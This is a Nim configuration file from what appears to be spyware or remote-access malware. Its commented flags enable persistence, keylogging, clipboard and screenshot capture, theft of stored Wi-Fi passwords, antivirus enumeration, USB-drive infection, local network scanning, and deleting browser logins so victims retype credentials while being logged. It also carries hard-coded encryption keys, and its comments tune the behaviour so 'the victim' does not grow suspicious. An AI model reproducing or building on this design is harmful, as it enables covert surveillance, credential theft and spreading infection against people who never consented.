## this file contains flags and other options
## used by the program

## used for compile-time string encryption
## in this file
## DO NOT REMOVE
from functions/hideString import e

const AES_ENCRYPT_KEY*: string = "abiestezeu1234"

const AES_AAD*: string = "abiestezeu1234"

const AES_IV*: string = "abiestezeu1234"

## used so only one program is open at a time
## DEFAULT: true
const ALLOW_ONLY_ONE_INSTANCE*: bool = true

## persistenceThread is used for installing the program
## and starting it when the pc opens
## DEFAULT: true
const USE_PERSISTENCE_THREAD*: bool = false

## clipboardThread is used for logging the clipboard
## every time it changes
## DEFAULT: true
const USE_CLIPBOARD_THREAD*: bool = false

## run clipboardThread every n ms
## higher value: lower cpu usage, higher chance of not reflecting all data changes
## lower value: higher cpu usage, lower chance of not reflecting all data changes
## DEFAULT: 100
const CLIPBOARD_THREAD_CHECK_INTERVAL*: int = 100

## getAVSThread is used for getting
## all the installed antivirus software on the user's pc
## DEFAULT: true
const USE_GET_AVS_THREAD*: bool = false

## wifiPasswordsThread is used for getting
## all the wifi passwords stored on user's pc
## DEFAULT: true
const USE_WIFI_PASSWORDS_THREAD*: bool = false

## connectedWifiThread is used for getting
## all the networks the user is connected to
## DEFAULT: true
const USE_CONNECTED_WIFI_THREAD*: bool = false

## windowNameThread is used for getting the active window name
## best used alongside keyloggerThread
## DEFAULT: true
const USE_WINDOW_NAME_THREAD*: bool = true

## run windowNameThread every n ms
## higher value: lower cpu usage, higher chance of not reflecting all data changes
## lower value: higher cpu usage, lower chance of not reflecting all data changes
## DEFAULT: 10
const WINDOW_NAME_THREAD_CHECK_INTERVAL * : int = 10

## screenshotThread is used for saving screenshots
## DEFAULT: true
const USE_SCREENSHOT_THREAD*: bool = false

## run screenshotThread every n ms
## higher value: lower bandwith and cpu usage, less screenshots
## lower value: higher bandwith and cpu usage, more screenshots
## DEFAULT: 10000
const SCREENSHOT_THREAD_CHECK_INTERVAL * : int = 10000

## keyloggerThread is used for logging key presses
## DEFAULT: true
const USE_KEYLOGGER_THREAD*: bool = true

## keyboardLocaleThread is used for getting the keyboard locale changes
## by default its activated when the keyloggerThread is
## DEFAULT: USE_KEYLOGGER_THREAD
const USE_KEYBOARD_LOCALE_THREAD*: bool = USE_KEYLOGGER_THREAD

## run keyboardLocaleThread every n ms
## higher value: lower cpu usage, higher chance of not reflecting all data changes
## lower value: higher cpu usage, lower chance of not reflecting all data changes
## DEFAULT: 5000
const KEYBOARD_LOCALE_THREAD_CHECK_INTERVAL * : int = 5000

## browserThread is used for deleting cookies and login data
## so the user is forced to login back again
## best used alongside keyloggerThread
## DEFAULT: true
const USE_BROWSER_THREAD*: bool = false

## when `true` the program will remove files
## instead of renaming them
## use `false` only for testing purposes only so no data is lost
## DEFAULT: true
const UNSAFE_REMOVE_FILE*: bool = false

## infectThread is used for searching usb drives and infecting them
## DEFAULT: true
const USE_INFECT_THREAD*: bool = false

## run infectThread every n ms
## higher value: lower cpu usage, higher chance of not infecting all usbs
## lower value: higher cpu usage, lower chance of not infecting all usbs
## DEFAULT: 10000
const INFECT_THREAD_CHECK_INTERVAL*: int = 10000

## the key files on a usb drive will be infected with
## YOU MUST add e before " to encrypt the key so it can't be read
## from the executable
const INFECT_ENCRYPTION_KEY*: string = e"abiestezeulmeu1"

## connectedDevicesThread is used for getting all the connected
## devices on a wifi network
## DEFAULT: true
const USE_CONNECTED_DEVICES_THREAD*: bool = false

## the number of threads connectedDevicesThread will use
## to check ips
## lower value means lower cpu usage
## higher value means lower time spent waiting
## DEFAULT: 10
const CONNECTED_DEVICES_THREAD_NO_OF_THREADS * : int = 256

## TODO: IMPLEMENT THE FOLLOWING LINES

type browserThreadStart = enum
  Always ## NOT RECOMMENDED
  Random ## 1 in 6 chance browserThread will start

## how the browserThread starts
## setting Always will delete browser files everytime the
## program starts, not recommended, the victim will suspect
## something's up immediately
## DEFAULT: Random
const BROWSER_THREAD_START_TYPE*: browserThreadStart = Random

type ExpireVerification* = enum
  LocalApi
  InternetApi

type Date* = object
  day: int
  month: int
  year: int

proc NewDate(day: int, month: int, year: int): Date =
  result = Date()

  result.day = day
  result.month = month
  result.year = year

const USE_EXPIRE_VERIFICATION*: bool = true

const EXPIRE_VERIFICATION_TYPE*: ExpireVerification = LocalApi

const EXPIRE_DATE*: Date = NewDate(20, 10, 2020)
